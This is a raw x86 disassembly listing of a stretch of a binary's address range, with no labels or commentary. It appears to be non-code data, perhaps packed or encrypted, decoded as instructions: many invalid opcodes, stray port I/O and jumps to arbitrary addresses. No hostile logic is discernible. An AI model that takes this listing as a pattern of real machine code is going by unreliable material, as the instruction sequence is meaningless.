  419a2b:	aad    0xa2
  419a2d:	(bad)  
  419a2e:	ins    BYTE PTR es:[edi],dx
  419a2f:	inc    ebx
  419a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a31:	or     al,0x13
  419a33:	stos   BYTE PTR es:[edi],al
  419a34:	fsub   DWORD PTR [edi]
  419a36:	xchg   esp,eax
  419a37:	push   esp
  419a38:	das    
  419a39:	xor    edi,DWORD PTR [edi+0x6c]
  419a3c:	mov    eax,ds:0x390e8461
  419a41:	cmp    al,0xfd
  419a43:	xor    bl,BYTE PTR [eax]
  419a45:	and    al,0xb
  419a47:	xor    eax,0x4ee9a8fb
  419a4c:	lock inc DWORD PTR ds:[edi+0x2a]
  419a51:	cmp    bh,bl
  419a53:	xlat   BYTE PTR ds:[ebx]
  419a54:	cwde   
  419a55:	fwait
  419a56:	arpl   WORD PTR [edi+0x70602e6],bp
  419a5c:	repz push ss
  419a5e:	add    al,0x26
  419a60:	and    edi,DWORD PTR [ecx]
  419a62:	lods   eax,DWORD PTR ds:[esi]
  419a63:	gs sar dh,cl
  419a66:	sub    BYTE PTR [edx-0x393ee186],dl
  419a6c:	(bad)  
  419a6d:	cld    
  419a6e:	loopne 0x4199fd
  419a70:	mov    ds:0x2bfa7dd5,eax
  419a75:	mov    ebp,0xaadd2466
  419a7a:	dec    edi
  419a7b:	push   ds
  419a7c:	cli    
  419a7d:	and    cl,BYTE PTR [ebx+0x6cac7d7f]
  419a83:	jmp    0x6a531e27
  419a88:	add    al,0x8e
  419a8a:	mov    BYTE PTR [eax],ch
  419a8c:	out    0xad,al
  419a8e:	jmp    0x419ae7
  419a90:	fwait
  419a91:	loopne 0x419a18
  419a93:	pop    bp
  419a95:	push   0x78
  419a97:	in     eax,dx
  419a98:	cs jne 0x419a63
  419a9b:	add    DWORD PTR [esi+0x47],ecx
  419a9e:	pusha  
  419a9f:	pop    ecx
  419aa0:	and    al,bl
  419aa2:	inc    esi
  419aa3:	cdq    
  419aa4:	mov    cl,0x13
  419aa6:	sti    
  419aa7:	jg     0x419afa
  419aa9:	push   esp
  419aaa:	push   es
  419aab:	adc    edi,ebp
  419aad:	mov    esp,DWORD PTR [esi+eiz*1]
  419ab0:	outs   dx,BYTE PTR ds:[esi]
  419ab1:	push   esp
  419ab2:	repz mov ds:0x846206b3,eax
  419ab8:	and    edi,eax
  419aba:	and    BYTE PTR [edx-0x51],cl
  419abd:	push   ss
  419abe:	dec    esi
  419abf:	add    edi,edx
  419ac1:	lock jmp 0x419a66
  419ac4:	ror    BYTE PTR [eax-0x4a90fbc8],1
  419aca:	pextrw edi,mm1,0xc5
  419ace:	pop    ecx
  419acf:	mov    al,0x76
  419ad1:	test   al,0x1f
  419ad3:	adc    BYTE PTR [edi],bl
  419ad5:	mov    edi,0x5c7cdb9
  419ada:	out    dx,al
  419adb:	dec    edx
  419adc:	jg     0x419b24
  419ade:	es out 0xf1,eax
  419ae1:	mov    bh,0x5a
  419ae3:	retf   0x5c74
  419ae6:	adc    ah,BYTE PTR [edx-0x60f62356]
  419aec:	hlt    
  419aed:	inc    ebp
  419aee:	adc    eax,0xd26699ef
  419af3:	adc    eax,0xc83788ed
  419af8:	push   esi
  419af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419afa:	fisttp QWORD PTR [ebp+0x782faa5c]
  419b00:	mov    ds:0x63b2f4d4,al
  419b05:	imul   esp,DWORD PTR [ebp-0x473bd7b9],0x26370f68
  419b0f:	push   ecx
  419b10:	(bad)  
  419b11:	retf   
  419b12:	mov    ecx,0x8f507528
  419b17:	jge    0x419a9a
  419b19:	pushf  
  419b1a:	jp     0x419b3d
  419b1c:	add    bh,BYTE PTR [edi]
  419b1e:	pop    edx
  419b1f:	mov    WORD PTR [ebx-0x52],es
  419b22:	mov    edx,0xbf26ac73
  419b27:	pop    ecx
  419b28:	xor    eax,0xd7a648ed
  419b2d:	fld    DWORD PTR [edi-0x2b972561]
  419b33:	sub    BYTE PTR [esi],bh
  419b35:	dec    esi
  419b36:	enter  0xa98b,0x5a
  419b3a:	lock ja 0x419b5d
  419b3d:	adc    al,0x94
  419b3f:	push   esp
  419b40:	hlt    
  419b41:	int3   
  419b42:	out    dx,eax
  419b43:	sar    BYTE PTR [edi+0x2356fbb8],1
  419b49:	sti    
  419b4a:	mov    WORD PTR ds:0xb3fd6e4f,ss
  419b50:	push   ebx
  419b51:	push   es
  419b52:	pop    ebx
  419b53:	iret   
  419b54:	xchg   edi,eax
  419b55:	pushf  
  419b56:	xlat   BYTE PTR ds:[ebx]
  419b57:	jl     0x419aec
  419b59:	jb     0x419adb
  419b5b:	pop    es
  419b5c:	cmp    ecx,ebp
  419b5e:	sti    
  419b5f:	mov    dh,0x71
  419b61:	and    bl,dl
  419b63:	cmp    eax,0xa9332bdb
  419b68:	mov    DWORD PTR [ebp-0x2e6e9b84],edx
  419b6e:	retf   
  419b6f:	and    DWORD PTR [edi-0x74cc41fa],0x47
  419b76:	jae    0x419b0f
  419b78:	xchg   esp,eax
  419b79:	sub    BYTE PTR ds:0x6720a333,bl
  419b7f:	imul   ebx,DWORD PTR [ecx-0x2b53dc6c],0xffffff97
  419b86:	lds    ebp,FWORD PTR [ebp-0x69ec09dc]
  419b8c:	sbb    DWORD PTR [ecx-0x28033e8f],ebp
  419b92:	xchg   esp,eax
  419b93:	out    dx,eax
  419b94:	cs mov ch,0x95
  419b97:	je     0x419bfd
  419b99:	popa   
  419b9a:	xchg   ebx,eax
  419b9b:	push   0xe0c92fd8
  419ba0:	inc    edi
  419ba1:	dec    eax
  419ba2:	sbb    al,0x7b
  419ba4:	in     al,dx
  419ba5:	mov    cl,0xa9
  419ba7:	add    ebp,esi
  419ba9:	ins    DWORD PTR es:[edi],dx
  419baa:	inc    esp
  419bab:	adc    DWORD PTR [eax+0x20],esp
  419bae:	pushf  
  419baf:	or     ecx,edi
  419bb1:	sbb    BYTE PTR [edx-0x56],al
  419bb4:	test   eax,0x7b656ae8
  419bb9:	inc    edi
  419bba:	jb     0x419bfc
  419bbc:	sti    
  419bbd:	outs   dx,DWORD PTR ds:[esi]
  419bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bbf:	lock jns 0x419c14
  419bc2:	or     DWORD PTR [edx+eax*8-0x155bc2e2],esi
  419bc9:	jmp    0xf08d:0x3fa736cc
  419bd0:	mov    ds:0xacf60019,al
  419bd5:	mov    ds:0x3340f88b,eax
  419bda:	adc    BYTE PTR [ebp+0x23],0xd5
  419bde:	pop    eax
  419bdf:	inc    edx
  419be0:	sbb    al,0xe0
  419be2:	lds    eax,FWORD PTR [esi-0x29d5c7aa]
  419be8:	out    dx,eax
  419be9:	fisttp DWORD PTR [eax]
  419beb:	xor    DWORD PTR [edi-0x36],ecx
  419bee:	jb     0x419b78
  419bf0:	xor    BYTE PTR [ebx-0x29],0x4b
  419bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf5:	out    dx,eax
  419bf6:	mov    cl,0x1c
  419bf8:	ja     0x419bbc
  419bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bfb:	daa    
  419bfc:	pop    ss
  419bfd:	pop    eax
  419bfe:	or     edi,DWORD PTR [ecx+0x2e]
  419c01:	in     al,0x38
  419c03:	ltr    WORD PTR [edx-0x6cd2515a]
  419c0a:	jno    0x419bb8
  419c0c:	test   al,0x22
  419c0e:	pop    ebp
  419c0f:	out    0x6e,eax
  419c11:	bound  eax,QWORD PTR [esi]
  419c13:	pop    edi
  419c14:	pop    es
  419c15:	mov    DWORD PTR [ebp-0x53a235cc],eax
  419c1b:	push   esp
  419c1c:	outs   dx,DWORD PTR ds:[esi]
  419c1d:	mov    DWORD PTR [edi+ebp*4],esi
  419c20:	nop    DWORD PTR [esi+esi*8]
  419c24:	sbb    ebx,DWORD PTR [edx-0x5a]
  419c27:	mov    dl,BYTE PTR [eax]
  419c29:	rcr    DWORD PTR [edx+0x901a358],0xbb
  419c30:	out    0x1a,eax
  419c32:	and    bl,bh
  419c34:	push   esp
  419c35:	icebp  
  419c36:	or     al,0x71
  419c38:	cdq    
  419c39:	push   esi
  419c3a:	scas   al,BYTE PTR es:[edi]
  419c3b:	int3   
  419c3c:	stos   BYTE PTR es:[edi],al
  419c3d:	pop    esp
  419c3e:	xchg   edx,eax
  419c3f:	jb     0x419c27
  419c41:	sbb    ah,BYTE PTR [edx-0x54]
  419c44:	rcr    DWORD PTR [esi],cl
  419c46:	xor    esi,ebp
  419c48:	push   esi
  419c49:	ret    
  419c4a:	ror    bh,0x13
  419c4d:	ficom  DWORD PTR [edi-0x60]
  419c50:	adc    edx,DWORD PTR [esi]
  419c52:	jns    0x419c45
  419c54:	pop    ebp
  419c55:	push   ds
  419c56:	inc    ecx
  419c57:	into   
  419c58:	mov    eax,ds:0xae97a67d
  419c5d:	arpl   WORD PTR [edx],si
  419c5f:	lods   al,BYTE PTR ds:[esi]
  419c60:	bound  esi,QWORD PTR [edi+eax*8]
  419c63:	cwde   
  419c64:	js     0x419c07
  419c66:	inc    edi
  419c67:	mov    eax,fs:0xa8707713
  419c6d:	and    eax,0xcdef27dc
  419c72:	fwait
  419c73:	int3   
  419c74:	xor    edx,ebp
  419c76:	daa    
  419c77:	scas   eax,DWORD PTR es:[edi]
  419c78:	loopne 0x419c2c
  419c7a:	rcl    DWORD PTR [esi],0x9e
  419c7d:	xchg   esi,eax
  419c7e:	xchg   BYTE PTR ds:0x356f32bc,bl
  419c84:	jo     0x419c18
  419c86:	stc    
  419c87:	scas   al,BYTE PTR es:[edi]
  419c88:	ins    BYTE PTR es:[edi],dx
  419c89:	xlat   BYTE PTR ds:[ebx]
  419c8a:	test   DWORD PTR [ecx],ecx
  419c8c:	shl    BYTE PTR [esi],0xa2
  419c8f:	in     eax,dx
  419c90:	or     eax,0xdb61ba52
  419c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c96:	js     0x419d0d
  419c98:	add    edi,edi
  419c9a:	push   ecx
  419c9b:	inc    esi
  419c9c:	mov    dl,0xbc
  419c9e:	cli    
  419c9f:	xor    eax,0x15d4c61d
  419ca4:	stc    
  419ca5:	inc    esp
  419ca6:	cmp    esp,DWORD PTR [ebx+0x66]
  419ca9:	daa    
  419caa:	sbb    DWORD PTR [eax+0x3ff09b3b],0xffffff81
  419cb1:	add    al,0x4e
  419cb3:	add    al,0xc6
  419cb5:	mov    BYTE PTR [edi+esi*2],dl
  419cb8:	pop    es
  419cb9:	in     al,dx
  419cba:	daa    
  419cbb:	sub    al,BYTE PTR [edx+0x0]
  419cbe:	jl     0x419ce8
  419cc0:	mov    ds:0x11afa602,al
  419cc5:	mov    ds:0x8a4e4691,al
  419cca:	and    BYTE PTR [edx+ecx*1],bl
  419ccd:	stc    
  419cce:	(bad)  
  419cd0:	(bad)  
  419cd1:	fadd   st(7),st
  419cd3:	inc    BYTE PTR [ebx+edx*4+0x8]
  419cd7:	dec    eax
  419cd8:	jae    0x419cf6
  419cda:	jb     0x419d48
  419cdc:	std    
  419cdd:	fmul   DWORD PTR [ecx+ecx*2-0x5000dd6d]
  419ce4:	xor    ch,bl
  419ce6:	hlt    
  419ce7:	and    esi,edi
  419ce9:	dec    esp
  419cea:	in     al,dx
  419ceb:	xchg   edx,eax
  419cec:	sbb    al,0xa2
  419cee:	loopne 0x419d01
  419cf0:	pop    es
  419cf1:	(bad)  
  419cf2:	push   edi
  419cf3:	gs push edi
  419cf5:	popf   
  419cf6:	xchg   edi,eax
  419cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cf8:	jle    0x419c7d
  419cfa:	xor    BYTE PTR [eax],cl
  419cfc:	std    
  419cfd:	aas    
  419cfe:	idiv   BYTE PTR [edx-0x57426a0a]
  419d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d05:	test   edi,ebx
  419d07:	pop    esi
  419d08:	idiv   bh
  419d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d0b:	mov    DWORD PTR [ebx],0xad202c62
  419d11:	cmp    eax,0x571ac6fb
  419d16:	daa    
  419d17:	push   ebp
  419d18:	cld    
  419d19:	xchg   DWORD PTR [ebp-0x52fc3993],esi
  419d1f:	inc    esi
  419d20:	bound  esi,QWORD PTR [edx]
  419d22:	adc    DWORD PTR [ebp-0x147ff68c],0xffffffd5
  419d29:	pop    edi
  419d2a:	or     BYTE PTR [esi+0x6244cdae],0xa
  419d31:	or     DWORD PTR [esi+0x7e21b3b7],edx
  419d37:	stos   DWORD PTR es:[edi],eax
  419d38:	out    0x26,al
  419d3a:	nop
  419d3b:	mov    dh,BYTE PTR ds:0x3c091960
  419d41:	inc    ecx
  419d42:	aad    0x7b
  419d44:	cs lock dec edx
  419d47:	lahf   
  419d48:	lahf   
  419d49:	add    eax,0x9d271048
  419d4e:	adc    al,0x9c
  419d50:	lods   eax,DWORD PTR ds:[esi]
  419d51:	cs push es
  419d53:	pop    esp
  419d54:	xchg   BYTE PTR [edx*4-0x17cf130b],dl
  419d5b:	inc    edx
  419d5c:	inc    ebp
  419d5d:	mov    edi,0x8f7f4719
  419d62:	adc    dl,ch
  419d64:	ret    0xaa86
  419d67:	push   edx
  419d68:	mov    dh,0x51
  419d6a:	icebp  
  419d6b:	imul   esp,ebp,0xffffff81
  419d6e:	inc    eax
  419d6f:	push   edi
  419d70:	push   edx
  419d71:	add    eax,0x5ffb9c8b
  419d76:	jno    0x419d2e
  419d78:	push   ecx
  419d79:	adc    ah,ah
  419d7b:	retf   
  419d7c:	repz loopne 0x419d6c
  419d7f:	add    DWORD PTR [ebp+0x51],edi
  419d82:	iret   
  419d83:	sub    eax,0x910df787
  419d88:	lock sbb DWORD PTR [edi-0x43],edx
  419d8c:	xacquire xchg DWORD PTR [esi-0x5fb2e4c],edx
  419d93:	dec    ebx
  419d94:	cmp    ebp,DWORD PTR [esi-0x15b1ea35]
  419d9a:	dec    ebx
  419d9b:	mov    cl,0x9
  419d9d:	out    0xc1,al
  419d9f:	shl    BYTE PTR [ebp+0x42],0xd3
  419da3:	xchg   ecx,eax
  419da4:	stc    
  419da5:	pop    ss
  419da6:	push   ss
  419da7:	sahf   
  419da8:	lds    esp,FWORD PTR [ecx+0x465a7994]
  419dae:	fs loope 0x419e07
  419db1:	mov    esp,0x96844ee5
  419db6:	mov    ah,0xc8
  419db8:	xchg   edx,esp
  419dba:	push   es
  419dbb:	mov    bl,0xa5
  419dbd:	icebp  
  419dbe:	leave  
  419dbf:	aaa    
  419dc0:	pop    edx
  419dc1:	mov    eax,0xe56f77d5
  419dc6:	cmp    DWORD PTR [esp+ecx*1+0x73],esi
  419dca:	pop    eax
  419dcb:	popa   
  419dcc:	jae    0x419d8e
  419dce:	fdivr  DWORD PTR [eax-0x5ffbb260]
  419dd4:	ss mov edx,0x294bb552
  419dda:	loopne 0x419d81
  419ddc:	sbb    BYTE PTR [edi+0x402af63],ch
  419de2:	push   esp
  419de3:	xchg   ebp,eax
  419de4:	sub    BYTE PTR [ebx-0x49],ah
  419de7:	push   cs
  419de8:	inc    esi
  419de9:	mov    eax,ds:0xcc97013a
  419dee:	jo     0x419dbb
  419df0:	frndint 
  419df2:	jp     0x419ddc
  419df4:	jp     0x419db8
  419df6:	iret   
  419df7:	(bad)  
  419df8:	xchg   edi,eax
  419df9:	sti    
  419dfa:	outs   dx,DWORD PTR ds:[esi]
  419dfb:	push   edi
  419dfc:	retf   0x2e65
  419dff:	dec    eax
  419e00:	sub    DWORD PTR [eax+0x53534437],edi
  419e06:	mov    esp,0xed2494d0
  419e0b:	sub    bl,bh
  419e0d:	mov    ss,WORD PTR [esi+0x4f]
  419e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e11:	js     0x419db7
  419e13:	xor    eax,0x7f6866b6
  419e18:	sub    DWORD PTR [eax],ebp
  419e1a:	enter  0x3ef9,0x8b
  419e1e:	out    dx,eax
  419e1f:	sub    esp,esp
  419e21:	stc    
  419e22:	inc    ebx
  419e23:	xor    BYTE PTR [edi],bh
  419e25:	xchg   ebx,eax
  419e26:	push   0xe794892e
  419e2b:	mov    BYTE PTR [eax],0xbe
  419e2e:	dec    eax
  419e2f:	call   0x31ffae90
  419e34:	ror    DWORD PTR [edx-0x46158fd7],0x66
  419e3b:	xchg   ecx,eax
  419e3c:	xor    DWORD PTR [ebp+0x27],edi
  419e3f:	push   cs
  419e40:	cdq    
  419e41:	js     0x419dec
  419e43:	imul   esi,DWORD PTR [ebx],0x9f32e4c2
  419e49:	and    BYTE PTR [esi+0x40180b71],0x47
  419e50:	pop    edx
  419e51:	add    edx,0x25f02fe9
  419e57:	jnp    0x419e69
  419e59:	cmc    
  419e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e5b:	fistp  QWORD PTR [eax+0x78]
  419e5e:	adc    BYTE PTR [edi+eiz*1],cl
  419e61:	mov    ch,0xfe
  419e63:	sbb    dh,BYTE PTR [esi-0x49]
  419e66:	inc    ecx
  419e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e68:	popa   
  419e69:	xor    esp,eax
  419e6b:	jl     0x419ee1
  419e6d:	fistp  WORD PTR [edx+0x29]
  419e70:	add    ch,bh
  419e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e73:	push   es
  419e74:	xor    esi,DWORD PTR [eax-0x13a33264]
  419e7a:	ror    DWORD PTR [ecx+0x3b],1
  419e7d:	test   DWORD PTR [esi-0x58],ecx
  419e80:	jns    0x419e3e
  419e82:	push   eax
  419e83:	ja     0x419e4f
  419e85:	bound  edi,QWORD PTR [ecx]
  419e87:	pushf  
  419e88:	jb     0x419e6f
  419e8a:	push   ebp
  419e8b:	outs   dx,BYTE PTR ds:[esi]
  419e8c:	enter  0x63f4,0xd3
  419e90:	je     0x419eb2
  419e92:	add    eax,0x6ab3d084
  419e97:	add    ah,BYTE PTR ds:0xe1f8c93b
  419e9d:	pop    ss
  419e9e:	ins    DWORD PTR es:[edi],dx
  419e9f:	fcom   st(2)
  419ea1:	jnp    0x419f14
  419ea3:	test   al,0xe0
  419ea5:	adc    eax,0x6f239a57
  419eaa:	call   0xabd7:0x6c9208d0
  419eb1:	pop    ebp
  419eb2:	int    0xef
  419eb4:	mov    bh,0x37
  419eb6:	adc    eax,0xd0b104aa
  419ebb:	cmp    al,0x9f
  419ebd:	int3   
  419ebe:	mov    edi,0x5949f01c
  419ec3:	push   es
  419ec4:	add    BYTE PTR [ecx-0x1dc3ef71],ah
  419eca:	dec    eax
  419ecb:	iret   
  419ecc:	xor    DWORD PTR [eax+0x40],0xc1ba7d6e
  419ed3:	in     al,dx
  419ed4:	add    al,0xe9
  419ed6:	mov    al,0xab
  419ed8:	shl    DWORD PTR [edi-0x74],1
  419edb:	push   es
  419edc:	adc    BYTE PTR [eiz*8+0x37222623],ch
  419ee3:	cli    
  419ee4:	inc    ebx
  419ee5:	sub    DWORD PTR [esi],0xde942f99
  419eeb:	or     edi,esi
  419eed:	(bad)  
  419eef:	lods   eax,DWORD PTR ds:[esi]
  419ef0:	outs   dx,DWORD PTR ds:[esi]
  419ef1:	push   esp
  419ef2:	sbb    bh,BYTE PTR [ecx+0x114b11f4]
  419ef8:	lods   al,BYTE PTR ds:[esi]
  419ef9:	retf   
  419efa:	mov    al,0x99
  419efc:	or     al,0x10
  419efe:	and    esp,DWORD PTR [edx+eax*1-0xf]
  419f02:	cmc    
  419f03:	in     al,dx
  419f04:	jnp    0x419ee0
  419f06:	jg     0x419f58
  419f08:	push   eax
  419f09:	push   es
  419f0a:	or     DWORD PTR [edi],edx
  419f0c:	jae    0x419f18
  419f0e:	imul   edi,DWORD PTR [eax-0x54],0x3
  419f12:	int3   
  419f13:	push   edi
  419f14:	jp     0x419f19
  419f16:	mov    dh,0x6e
  419f18:	fcmovnbe st,st(6)
  419f1a:	jbe    0x419f8b
  419f1c:	mov    ch,0xd7
  419f1e:	aas    
  419f1f:	ret    
  419f20:	xchg   ebp,eax
  419f21:	inc    esp
  419f22:	mov    bl,0x62
  419f24:	sub    ebx,DWORD PTR [eax-0x43]
  419f27:	imul   ecx,DWORD PTR [eax-0x3409b7b3],0x64e5bfa
  419f31:	and    eax,0x165d2e6f
  419f36:	xor    ebx,DWORD PTR [ecx]
  419f38:	rol    BYTE PTR [ecx+0x73],0xaa
  419f3c:	pusha  
  419f3d:	sub    esi,0x958d1012
  419f43:	and    al,0x19
  419f45:	int3   
  419f46:	jae    0x419f84
  419f48:	xchg   esi,eax
  419f49:	call   0xfcc4:0x9bca61cd
  419f50:	jmp    0x7d026118
  419f55:	aas    
  419f56:	lock int 0x8b
  419f59:	xlat   BYTE PTR ds:[ebx]
  419f5a:	aaa    
  419f5b:	mov    ds:0xc8643e2d,eax
  419f60:	cmc    
  419f61:	mov    bl,0xdb
  419f63:	(bad)  
  419f65:	and    edi,ebp
  419f67:	dec    edi
  419f68:	dec    ebx
  419f69:	sahf   
  419f6a:	or     al,0x12
  419f6c:	jecxz  0x419fbb
  419f6e:	fistp  WORD PTR [eax]
  419f70:	mov    esp,0xeffd7c02
  419f75:	fwait
  419f76:	cmp    ecx,esi
  419f78:	adc    BYTE PTR [esi],0xd5
  419f7b:	adc    bl,al
  419f7d:	in     eax,0xf7
  419f7f:	ss pop ecx
  419f81:	dec    ecx
  419f82:	lods   eax,DWORD PTR ds:[esi]
  419f83:	(bad)  
  419f84:	push   ds
  419f85:	cmp    BYTE PTR [esi+0x75],ch
  419f88:	jp     0x419f31
  419f8a:	shl    DWORD PTR [edi+eiz*2+0x14],1
  419f8e:	ds push 0x12b44be8
  419f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f95:	cdq    
  419f96:	add    DWORD PTR [esp+eax*2+0x2a],ebx
  419f9a:	adc    ah,BYTE PTR [eax+0x792db53]
  419fa0:	jnp    0x419fdd
  419fa2:	mov    ebp,0xa05f2526
  419fa7:	test   BYTE PTR [edi],bh
  419fa9:	mov    ebp,0x929d544e
  419fae:	out    0xc1,eax
  419fb0:	ins    BYTE PTR es:[edi],dx
  419fb1:	add    eax,0x1b7a9ddb
  419fb6:	mov    cs,WORD PTR [ecx+0x7eef76bc]
  419fbc:	jle    0x419fe3
  419fbe:	mov    ds:0x7de0fb68,eax
  419fc3:	inc    edx
  419fc4:	or     DWORD PTR [edi+ecx*4+0x9],edx
  419fc8:	jb     0x419fc1
  419fca:	inc    BYTE PTR [ebp-0x12]
  419fcd:	xlat   BYTE PTR ds:[ebx]
  419fce:	lods   eax,DWORD PTR ds:[esi]
  419fcf:	clc    
  419fd0:	call   ebx
  419fd2:	cmp    ch,bh
  419fd4:	mov    DWORD PTR [ebx-0x73],esi
  419fd7:	pop    edx
  419fd8:	aam    0x3b
  419fda:	mov    dl,0x6f
  419fdc:	pop    ecx
  419fdd:	push   cs
  419fde:	mov    WORD PTR [ebp-0x38],cs
  419fe1:	(bad)  
  419fe2:	xor    al,0x86
  419fe4:	call   FWORD PTR [esp+edx*2]
  419fe7:	clc    
  419fe8:	pop    ds
  419fe9:	sar    ch,0x18
  419fec:	test   BYTE PTR [ebp-0x6],bl
  419fef:	fcomp  DWORD PTR [edi+0x3073003d]
  419ff5:	lahf   
  419ff6:	add    BYTE PTR [edi],ch
  419ff8:	sbb    dh,BYTE PTR [ecx+0x26]
  419ffb:	add    al,0xcd
  419ffd:	leave  
  419ffe:	jle    0x419fde
  41a000:	stos   BYTE PTR es:[edi],al
  41a001:	in     eax,0x2d
  41a003:	inc    ecx
  41a004:	adc    DWORD PTR [eax+0x21],ebx
  41a007:	repnz mov al,0xb7
  41a00a:	out    dx,al
  41a00b:	int3   
  41a00c:	dec    edx
  41a00d:	xor    ebx,eax
  41a00f:	xchg   ebx,eax
  41a010:	shl    dl,0x68
  41a013:	sti    
  41a014:	mov    ecx,0x816e7de9
  41a019:	inc    ecx
  41a01a:	and    al,0x65
  41a01c:	(bad)  
  41a01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a01e:	pusha  
  41a01f:	jmp    0xb320:0x8373b416
  41a026:	es jp  0x41a088
  41a029:	inc    eax
  41a02a:	add    ah,dl
  41a02c:	(bad)  
  41a02d:	xchg   ebx,eax
  41a02e:	jne    0x41a05c
  41a030:	xor    BYTE PTR [edx-0x64fc1f84],cl
  41a036:	adc    dl,bh
  41a038:	sbb    al,0x74
  41a03a:	cmp    dl,cl
  41a03c:	ret    
  41a03d:	adc    DWORD PTR [ebp+0x73edbea6],ebx
  41a043:	aaa    
  41a044:	fist   DWORD PTR [eax]
  41a046:	cmp    eax,0x40fe33ac
  41a04b:	push   esp
  41a04c:	clc    
  41a04d:	xchg   edi,eax
  41a04e:	mov    edx,0xfb262097
  41a053:	jp     0x419fdc
  41a055:	dec    ecx
  41a056:	push   cs
  41a057:	add    bh,BYTE PTR [ebx-0xab39629]
  41a05d:	shl    DWORD PTR cs:[ebx-0x6c],1
  41a061:	push   esp
  41a062:	xchg   ebx,eax
  41a063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a065:	cmp    eax,0x7d2dbf0a
  41a06a:	icebp  
  41a06b:	repz ds push 0x1ce5538b
  41a072:	pusha  
  41a073:	and    BYTE PTR [ecx-0x53],ch
  41a076:	add    bl,BYTE PTR [ebx+0x2]
  41a079:	cs jl  0x41a0b2
  41a07c:	fwait
  41a07d:	pop    esp
  41a07e:	cli    
  41a07f:	sbb    eax,0x28722edd
  41a084:	retf   
  41a085:	xchg   esi,eax
  41a086:	mov    BYTE PTR [edi-0x76],dh
  41a089:	jg     0x41a08e
  41a08b:	jmp    DWORD PTR [esi-0x20]
  41a08e:	lods   al,BYTE PTR ds:[esi]
  41a08f:	cmp    BYTE PTR [ebx],bl
  41a091:	or     esi,eax
  41a093:	je     0x41a09f
  41a095:	sti    
  41a096:	data16 and al,BYTE PTR [ebx-0xa]
  41a09a:	icebp  
  41a09b:	fild   DWORD PTR [edx+ebp*4+0x67]
  41a09f:	add    ecx,DWORD PTR [edi-0x19]
  41a0a2:	inc    eax
  41a0a3:	mov    ds,ebp
  41a0a5:	ds cmp eax,ebx
  41a0a8:	jae    0x41a0c3
  41a0aa:	inc    edx
  41a0ab:	popa   
  41a0ac:	cs mov dl,0xd0
  41a0af:	lea    ecx,ds:0x87d89b77
  41a0b5:	stos   DWORD PTR es:[edi],eax
  41a0b6:	sahf   
  41a0b7:	xchg   ebx,eax
  41a0b8:	iret   
  41a0b9:	fidivr WORD PTR [edi]
  41a0bb:	inc    edi
  41a0bc:	daa    
  41a0bd:	sub    BYTE PTR [ebx+edi*4],ch
  41a0c0:	cmp    al,0xe2
  41a0c2:	mov    ebx,0x1ae39e5b
  41a0c7:	out    dx,eax
  41a0c8:	add    al,BYTE PTR [ebx+0x52ee96ca]
  41a0ce:	mov    edx,0x16f91e94
  41a0d3:	xlat   BYTE PTR ds:[ebx]
  41a0d4:	sub    eax,0x9763b616
  41a0d9:	fld    TBYTE PTR [ecx-0x67]
  41a0dc:	(bad)  
  41a0dd:	retf   
  41a0de:	pop    ds
  41a0df:	outs   dx,DWORD PTR ds:[esi]
  41a0e0:	jae    0x41a0c5
  41a0e2:	cdq    
  41a0e3:	das    
  41a0e4:	add    al,BYTE PTR [esi-0x78884a77]
  41a0ea:	add    cl,BYTE PTR [ebp+eiz*2-0x444188a4]
  41a0f1:	xchg   ecx,eax
  41a0f2:	fsub   QWORD PTR ds:0xc9fec657
  41a0f8:	stc    
  41a0f9:	in     al,0xf1
  41a0fb:	mov    BYTE PTR [esi+0x6c5d31ce],bl
  41a101:	js     0x41a10c
  41a103:	cmp    al,0xdc
  41a105:	cmp    cl,bh
  41a107:	(bad)  
  41a108:	out    0x71,eax
  41a10a:	(bad)  
  41a10b:	ins    BYTE PTR es:[edi],dx
  41a10c:	out    0x39,al
  41a10e:	mov    al,cl
  41a110:	imul   edx,esp,0x557cd6e3
  41a116:	adc    eax,0xb81412d6
  41a11b:	pop    ss
  41a11c:	push   ebp
  41a11d:	std    
  41a11e:	mov    al,ds:0x13d5433e
  41a123:	stos   DWORD PTR es:[edi],eax
  41a124:	jo     0x41a13b
  41a126:	or     al,0x14
  41a128:	js     0x41a130
  41a12a:	mov    ecx,DWORD PTR [ecx+0x76cf6982]
  41a130:	add    eax,0xf6aa6f6c
  41a135:	pop    es
  41a136:	adc    bl,BYTE PTR [ecx+ebx*4]
  41a139:	dec    eax
  41a13a:	xchg   edi,eax
  41a13b:	jmp    0x88ff:0x130679f5
  41a142:	push   0x673d291e
  41a147:	out    0x58,al
  41a149:	xchg   ebx,eax
  41a14a:	aas    
  41a14b:	test   BYTE PTR [edi+0x521079f0],dh
  41a151:	fidiv  DWORD PTR [edi-0xc070aff]
  41a157:	dec    edx
  41a158:	or     eax,0x8bb98b07
  41a15d:	xlat   BYTE PTR ds:[ebx]
  41a15e:	in     al,dx
  41a15f:	sub    DWORD PTR [eax-0x2220f8b8],ecx
  41a165:	add    esp,edx
  41a167:	stos   BYTE PTR es:[edi],al
  41a168:	dec    esp
  41a169:	loopne 0x41a176
  41a16b:	sbb    DWORD PTR [edx-0x3ed1fed0],edx
  41a171:	inc    edi
  41a172:	out    0xd7,eax
  41a174:	push   ecx
  41a175:	repz test al,0x54
  41a178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a179:	(bad)  
  41a17a:	mov    cl,0x9b
  41a17c:	aad    0xb9
  41a17e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a17f:	fidivr WORD PTR [esi]
